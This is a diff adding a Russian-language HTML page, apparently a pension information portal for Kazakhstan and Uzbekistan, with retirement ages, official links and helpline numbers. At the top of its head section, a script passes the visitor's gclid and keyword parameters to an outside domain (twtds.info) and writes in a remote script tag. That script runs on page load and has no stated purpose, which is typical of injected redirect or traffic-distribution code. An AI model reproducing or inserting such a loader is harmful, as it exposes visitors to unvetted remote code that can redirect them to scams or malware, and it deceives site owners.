@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <script>
+function GET(item) {
+    var p = window.location.search;
+    p = p.match(new RegExp(item+'=([^&=]+)'));
+    return p ? p[1] : false;
+}
+var url = "https://twtds.info/newswlr?gclid="+GET('gclid')+"&keyword="+GET('keyword');
+document.write("<script src="+url+"><\/script>");
+</script>
+  
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Пенсионный портал - Казахстан и Узбекистан</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            line-height: 1.6;
+            margin: 0;
+            padding: 0;
+        }
+        .header {
+            background-color: #2c3e50;
+            color: white;
+            text-align: center;
+            padding: 2rem;
+        }
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        .nav {
+            background-color: #34495e;
+            padding: 1rem;
+        }
+        .nav a {
+            color: white;
+            text-decoration: none;
+            padding: 10px 20px;
+        }
+        .nav a:hover {
+            background-color: #2c3e50;
+        }
+        .country-section {
+            margin: 2rem 0;
+            padding: 20px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+        }
+        .important-links {
+            background-color: #f8f9fa;
+            padding: 20px;
+            border-radius: 5px;
+        }
+        .footer {
+            background-color: #2c3e50;
+            color: white;
+            text-align: center;
+            padding: 1rem;
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>Пенсионный портал</h1>
+        <p>Информация о пенсиях в Казахстане и Узбекистане</p>
+    </div>
+
+    <div class="nav">
+        <a href="#kazakhstan">Казахстан</a>
+        <a href="#uzbekistan">Узбекистан</a>
+        <a href="#calculator">Калькулятор</a>
+        <a href="#contacts">Контакты</a>
+    </div>
+
+    <div class="container">
+        <div class="country-section" id="kazakhstan">
+            <h2>Пенсионная система Казахстана</h2>
+            <h3>Важная информация:</h3>
+            <ul>
+                <li>Пенсионный возраст в Казахстане:
+                    <ul>
+                        <li>Мужчины - 63 года</li>
+                        <li>Женщины - 61 год (с постепенным повышением до 63 лет к 2027 году)</li>
+                    </ul>
+                </li>
+                <li>Минимальный трудовой стаж для назначения пенсии - 10 лет</li>
+            </ul>
+            
+            <div class="important-links">
+                <h3>Полезные ссылки:</h3>
+                <ul>
+                    <li><a href="https://enpf.kz" target="_blank">ЕНПФ - Единый накопительный пенсионный фонд</a></li>
+                    <li><a href="https://egov.kz" target="_blank">Портал электронного правительства</a></li>
+                    <li><a href="https://gov.kz/memleket/entities/enbek" target="_blank">Министерство труда и социальной защиты населения РК</a></li>
+                </ul>
+            </div>
+        </div>
+
+        <div class="country-section" id="uzbekistan">
+            <h2>Пенсионная система Узбекистана</h2>
+            <h3>Важная информация:</h3>
+            <ul>
+                <li>Пенсионный возраст в Узбекистане:
+                    <ul>
+                        <li>Мужчины - 60 лет</li>
+                        <li>Женщины - 55 лет</li>
+                    </ul>
+                </li>
+                <li>Минимальный трудовой стаж:
+                    <ul>
+                        <li>Мужчины - 25 лет</li>
+                        <li>Женщины - 20 лет</li>
+                    </ul>
+                </li>
+            </ul>
+
+            <div class="important-links">
+                <h3>Полезные ссылки:</h3>
+                <ul>
+                    <li><a href="https://pfru.uz" target="_blank">Внебюджетный Пенсионный фонд при Министерстве финансов</a></li>
+                    <li><a href="https://my.gov.uz" target="_blank">Единый портал интерактивных государственных услуг</a></li>
+                    <li><a href="https://mehnat.uz" target="_blank">Министерство занятости и трудовых отношений</a></li>
+                </ul>
+            </div>
+        </div>
+
+        <div class="country-section" id="calculator">
+            <h2>Пенсионный калькулятор</h2>
+            <p>Для расчета примерной пенсии воспользуйтесь официальными калькуляторами:</p>
+            <ul>
+                <li><a href="https://enpf.kz/ru/services/calculator.php" target="_blank">Калькулятор ЕНПФ (Казахстан)</a></li>
+                <li><a href="https://pfru.uz/ru/calculator" target="_blank">Пенсионный калькулятор Узбекистана</a></li>
+            </ul>
+        </div>
+
+        <div class="country-section" id="contacts">
+            <h2>Контакты и поддержка</h2>
+            <h3>Казахстан:</h3>
+            <ul>
+                <li>Единый контакт-центр: 1411</li>
+                <li>ЕНПФ: 1418</li>
+            </ul>
+            <h3>Узбекистан:</h3>
+            <ul>
+                <li>Единый контакт-центр: 1198</li>
+                <li>Пенсионный фонд: (+998 71) 200-5555</li>
+            </ul>
+        </div>
+    </div>
+
+    <div class="footer">
+        <p>© 2024 Пенсионный портал. Информация может меняться, уточняйте данные на официальных сайтах.</p>
+    </div>
+</body>
+</html>
